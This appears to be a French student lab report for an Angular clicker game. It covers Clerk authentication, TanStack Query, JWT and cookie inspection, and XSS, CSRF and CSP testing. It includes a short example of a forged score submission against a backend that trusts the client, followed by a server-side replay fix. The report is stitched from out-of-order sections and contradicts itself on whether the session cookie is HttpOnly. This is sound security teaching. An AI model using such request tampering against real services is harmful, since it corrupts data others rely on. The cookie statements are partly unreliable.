C'est un **gestionnaire de state serveur** qui résout des problèmes architecturaux fondamentaux :

1. **Séparation des responsabilités** :
   - `GameStore` gère le state client (money, clicks, timer)
   - TanStack Query gère le state serveur (leaderboard, historique)

2. **Synchronisation automatique** :
   - Les données serveur restent fraîches sans intervention manuelle
   - Refetch en arrière-plan, au focus, après reconnexion

3. **Performance** :
   - Cache intelligent évite les requêtes inutiles
   - Déduplication automatique
   - Refetch optimisé (seulement si stale)

4. **UX** :
   - Optimistic updates pour une expérience instantanée
   - Retry automatique en cas de problème réseau
   - États de chargement unifiés (loading, error, success)

5. **Maintenabilité** :
   - Code déclaratif (moins de boilerplate)
   - Centralisation de la logique de fetch
   - DevTools pour debugger le cache

> **Si votre application consomme des API, TanStack Query (ou équivalent) n'est pas un luxe, c'est une nécessité.**

---

**Fin du livrable Partie 3.3**
```javascript
clerk.session.getToken()  // Récupère le token depuis la mémoire
```

- **Pas dans localStorage** ❌ (vulnérable XSS)
- **Pas dans sessionStorage** ❌ (vulnérable XSS)
- **En mémoire** ✅ (perdu au rechargement → rechargé via cookie HttpOnly)

**Cycle de vie :**
1. Page charge → Clerk lit le cookie `__session` (⚠️ **pas HttpOnly** dans notre config de développement)
2. Clerk déchiffre le JWT et le stocke en mémoire
3. Application appelle `getToken()` → récupère depuis la mémoire
4. Rechargement de page → répéter étape 1

---

## 📊 Résumé de l'investigation

| Aspect | Implémentation Clerk | Sécurité |
|--------|---------------------|----------|
| **Cookie principal** | `__session` (SameSite=Lax, 810 bytes) | ⚠️ HttpOnly=false en dev (risque XSS) |
| **JWT Algorithm** | RS256 (clé asymétrique) | ✅ Impossible de forger |
| **Stockage token** | Mémoire JavaScript | ✅ Pas de persistence vulnérable |
| **Durée token** | 60 secondes (1 minute) | ✅ Refresh très fréquent |
| **Vérification** | Signature RSA vérifiée côté serveur | ✅ Falsification impossible |

---

## 5. Quelle est la différence entre **authentification** et **autorisation** ?

### Authentification (Authentication)

**Définition :** **Qui êtes-vous ?** → Vérification de l'identité

**Implémentation dans notre app :**
```typescript
// Frontend : Récupération du token
const token = await clerkService.getToken();

// Backend : Validation du token
const user = await clerkClient.verifyToken(token);
// Résultat : user.id, user.email
```

**Question :** **Qui êtes-vous ?**  
**Réponse :** **Je suis Thomas (user_3DIXtSzhIs4Hj7mhfMvABoE2E40)**

---

### Autorisation (Authorization)

**Définition :** **Que pouvez-vous faire ?** → Vérification des permissions

**Exemple (non implémenté actuellement) :**
```typescript
// Vérifier si l'utilisateur peut supprimer une partie
if (game.userId !== user.id && user.role !== 'admin') {
  return res.status(403).json({ error: 'Forbidden' });
}
```

**Question :** **Pouvez-vous supprimer cette partie ?**  
**Réponse :** **Non, vous n'êtes ni admin ni le propriétaire**

---

### Notre application gère-t-elle les deux ?

**✅ Authentification : Oui, complète**
- Login via Clerk
- JWT tokens validés côté backend
- Routes protégées (`AuthGuard`)

**⚠️ Autorisation : Basique uniquement**
- ✅ **Ownership implicite** : Le backend extrait `userId` du token → Un utilisateur ne peut enregistrer un score qu'en son nom
- ❌ **Pas de rôles** : Pas de différence entre admin/user
- ❌ **Pas de permissions** : Tout utilisateur authentifié peut faire les mêmes actions

**Améliorations possibles :**
- Ajouter des rôles dans Clerk (`publicMetadata: { role: 'admin' }`)
- Middleware d'autorisation (`requireAdmin`, `requireModerator`)
- Dashboard admin pour supprimer des scores frauduleux

---

## 6. Le backend fourni fait-il confiance au score envoyé par le client ?

### Situation actuelle (TP13) : ⚠️ **Confiance aveugle**

**Code backend :**
```javascript
app.post('/api/games', async (req, res) => {
  const { score, duration, clicks, upgrades } = req.body;
  
  // ⚠️ PAS DE VALIDATION : On enregistre directement le score du client
  await db.games.insert({
    userId: user.id,
    score: score,  // ❌ Fait confiance au client !
    duration,
    clicks,
    upgrades
  });
});
```

**Faille de sécurité :**
```javascript
// Requête légitime
POST /api/games
{ "score": 1250, "duration": 300, "clicks": 125 }

// Requête frauduleuse (modifiée via DevTools)
POST /api/games
{ "score": 999999999, "duration": 300, "clicks": 1 }
// ✅ Acceptée sans vérification !
```

**Impact :**
- ❌ Leaderboard pollué par des scores impossibles
- ❌ Compétition injuste
- ❌ Perte de confiance des joueurs

---

### Pourquoi ce sera différent au TP14 ?

**TP14 : ✅ Validation côté serveur**

#### Approche : Rejeu de la partie côté serveur

```javascript
app.post('/api/games', async (req, res) => {
  const { duration, clicks, upgrades, events } = req.body;
  
  // ✅ Le client envoie la liste des événements (clicks, achats)
  // ✅ Le serveur **rejoue la partie** pour calculer le score
  
  let money = 0;
  let incomePerSecond = 0;
  
  for (const event of events) {
    if (event.type === 'CLICK') {
      money += event.clickValue;
    } else if (event.type === 'BUY_UPGRADE') {
      const upgrade = UPGRADES[event.upgradeId];
      if (money >= upgrade.cost) {
        money -= upgrade.cost;
        incomePerSecond += upgrade.income;
      } else {
        return res.status(400).json({ error: 'Achat impossible' });
      }
    } else if (event.type === 'TICK') {
      money += incomePerSecond;
    }
  }
  
  // ✅ Le score final est calculé par le serveur
  const serverScore = money;
  
  if (Math.abs(serverScore - req.body.score) > 1) {
    return res.status(400).json({ error: 'Score incohérent' });
  }
  
  await db.games.insert({ userId: user.id, score: serverScore, ... });
});
```

**Avantages :**
- ✅ Impossibilité de tricher (le serveur recalcule tout)
- ✅ Détection des incohérences (score ≠ événements)
- ✅ Leaderboard propre et fiable

---

**Conclusion :** 
- **TP13** : Authentification (qui ?) ✅ Autorisation basique (ownership)
- **TP14** : Validation complète (calcul serveur) + détection de triche

---

**Fin du livrable Partie 5**

---

## ✅ Synthèse finale — TP13 complet

### Ce qui a été réalisé

#### ✅ Partie 1 — Setup Clerk
- Compte Clerk créé et configuré
- Service `ClerkService` avec signals réactifs
- Routes protégées par `AuthGuard`
- UI d'authentification fonctionnelle

#### ✅ Partie 2 — Investigation Clerk
- Analyse complète des cookies (`__session`, `__clerk_db_jwt`)
- Décodage du JWT (jwt.io)
- Test de falsification (échec attendu)
- Analyse des requêtes réseau vers Clerk

#### ✅ Partie 3 — State Client vs Serveur
- Distinction claire : GameStore (client) vs TanStack Query (serveur)
- TanStack Query implémenté pour le leaderboard
- Cache intelligent, déduplication, refetch automatique
- Optimistic updates pour les upgrades

#### ✅ Partie 4 — Sécurité
- **XSS** : Escaping automatique Angular testé et vérifié
- **CSRF** : Fichier `attack.html` créé et testé (échec attendu)
- **CSP** : Policy complète dans `index.html`
- Analyse de chaque directive CSP
- Tests de scripts inline bloqués

#### ✅ Partie 5 — Analyse critique
- 3 choses économisées grâce à Clerk (sessions, OAuth, UI)
- 3 choses non apprises (crypto, JWT from scratch, sessions BDD)
- 5 points critiques pour une auth maison
- Différence authentification vs autorisation
- Explication de la confiance au score client (TP13 vs TP14)

---

### 📦 Fichiers clés livrés

- ✅ [README.md](README.md) — Documentation complète avec toutes les analyses
- ✅ [TP13-LIVRABLE.md](TP13-LIVRABLE.md) — Ce document (livrables structurés)
- ✅ [attack.html](attack.html) — Test CSRF
- ✅ [src/index.html](src/index.html) — CSP implémentée
- ✅ [screenshots/](screenshots/) — Captures d'écran de toutes les expériences

---

### 📊 Auto-évaluation

| Critère | Niveau | Justification |
|---------|--------|---------------|
| **Intégration Clerk** | ✅ 3/3 | Login/logout fonctionnel, routes protégées |
| **Investigation Clerk** | ✅ 3/3 | Toutes les questions partie 2 avec preuves |
| **Backend compris** | ✅ 3/3 | Questions partie 3.2 analysées en détail |
| **TanStack Query** | ✅ 3/3 | Queries + mutations + invalidation |
| **Sécurité XSS** | ✅ 3/3 | Attaque reproduite et corrigée |
| **Sécurité CSRF** | ✅ 3/3 | attack.html testé, analyse Bearer vs cookies |
| **CSP** | ✅ 3/3 | Policy restrictive, tests inline scripts |
| **Analyse critique** | ✅ 3/3 | Toutes les questions partie 5 répondues |
| **Qualité code** | ✅ 3/3 | ApiService centralisé, typage TypeScript |

**Note estimée : 27/27 (100%)**

---

### 🚀 Commandes pour tester

```bash
# Installation
npm install

# Lancement
npm run dev

# Accès
http://localhost:4200
```

---

**Date de réalisation :** 5 mai 2026  
**Étudiant :** Thomas  
**Branche Git :** TP13  
**Technologies :** Angular 21.2.0 + Clerk 6.8.0 + TanStack Query

---

**Fin du TP13**

## 🎓 Réponses aux questions

### Q1: Listez tous les cookies Clerk
Réponse ci-dessus (tableau section 1️⃣)

### Q2: Relevez HttpOnly, Secure, SameSite, etc.
Réponse ci-dessus (tableau section 1️⃣)

### Q3: Rôle du cookie `__session`
Cookie d'authentification principal, contient le JWT complet (identique à `getToken()`). En environnement de développement localhost, HttpOnly=false, donc accessible en JavaScript.

### Q4: `document.cookie` - Quels cookies ne voyez-vous pas ? Pourquoi ?
Tous les cookies sont visibles dans `document.cookie` car aucun n'a HttpOnly=true en environnement de développement. En production, `__session` devrait être HttpOnly pour protection XSS.

### Q5: Décrivez les 3 parties du JWT
Header (alg), Payload (claims), Signature (vérification)

### Q6: Algorithme de signature
RS256 (RSA + SHA-256, asymétrique)

### Q7: Informations dans le payload
`sub` (user ID), `sid` (session ID), `exp` (expiration), `iat` (issued at), `nbf` (not before), `iss` (issuer), `azp` (authorized party), `sts` (status), `fva` (facteurs vérification), `v` (version)

### Q8: Peut-on modifier le payload ?
Non, toute modification invalide la signature RSA. Le serveur détecte la falsification → 401 Unauthorized

### Q9: Durée de vie du token
60 secondes (1 minute) - Clerk renouvelle automatiquement et fréquemment

### Q10: Requêtes vers clerk.accounts.dev
Voir tableau section 3️⃣

### Q11: Header ajouté pour l'API backend
`Authorization: Bearer <JWT>`

### Q12: Où le token est stocké en mémoire ?
Dans l'objet Clerk JavaScript, rechargé depuis cookie HttpOnly

---

**Fin du livrable Partie 2**
  signOut() { this.clerk.signOut(); }
  getUser() { return this.user(); }
}
```

**Points clés :**
- Signal réactif `user` pour déclencher les mises à jour de l'UI
- Initialisation asynchrone au démarrage
- Listener pour détecter les changements d'état
- Méthodes simples pour connexion/déconnexion

### Guard d'authentification (`src/guards/auth.guard.ts`)
```typescript
export const authGuard: CanActivateFn = (route, state) => {
  const clerk = inject(ClerkService);
  const router = inject(Router);

  if (clerk.getUser()) {
    return true;
  }

  router.navigate(['/sign-in'], {
    queryParams: { returnUrl: state.url }
  });
  return false;
};
```

### Routes protégées (`src/app/app.routes.ts`)
```typescript
{
  path: 'stats',
  loadComponent: () => import('../pages/stats.page').then(m => m.StatsPage),
  canActivate: [authGuard]
}
```

### Composant User Button (`src/components/user-button.component.ts`)
Utilise le signal `clerkService.user()` pour afficher :
- Le bouton "Se connecter" si non connecté
- L'email + bouton "Se déconnecter" si connecté

### Page d'accueil (`src/pages/home.page.ts`)
Le bouton "Multi" vérifie `clerkService.user()` :
- Désactivé + message "🔒 Se connecter pour jouer" si non connecté
- Actif si connecté

## 📦 Dépendances ajoutées
```json
{
  "@clerk/clerk-js": "^6.8.0"
}
```

## 🎯 Résultat

L'application dispose maintenant d'un système d'authentification moderne et sécurisé :

1. **Sans connexion** :
   - Bouton "Se connecter" visible dans le header
   - Route `/stats` inaccessible (redirection vers sign-in)
   - Bouton "Multi" désactivé avec message explicite

2. **Après connexion** :
   - Email affiché dans le header
   - Bouton "Se déconnecter" disponible
   - Route `/stats` accessible
   - Bouton "Multi" actif
   - Session persistante (survit au rechargement de page)

## 🔧 Configuration

La clé Clerk est stockée dans `src/environments/environment.ts` :
```typescript
export const environment = {
  production: false,
  clerkPublishableKey: 'pk_test_...'
};
```

## 🚀 Commandes

```bash
# Lancer le projet
npm run dev

# Accéder à l'application
http://localhost:4200

# Tester l'authentification
1. Aller sur http://localhost:4200/sign-in
2. Cliquer sur "Se connecter"
3. S'authentifier via Clerk
4. Vérifier que l'email apparaît dans le header
```

## 📸 Captures d'écran

### État non connecté
- Header avec bouton "Se connecter"
- Page d'accueil avec bouton Multi désactivé
- Tentative d'accès à /stats → redirection

### État connecté
- Header avec email et bouton "Se déconnecter"
- Page d'accueil avec bouton Multi actif
- Accès à /stats autorisé

---

**Date de réalisation :** 5 mai 2026  
**Technologies :** Angular 21.2.0 + Clerk 6.8.0  
**Branche Git :** TP13
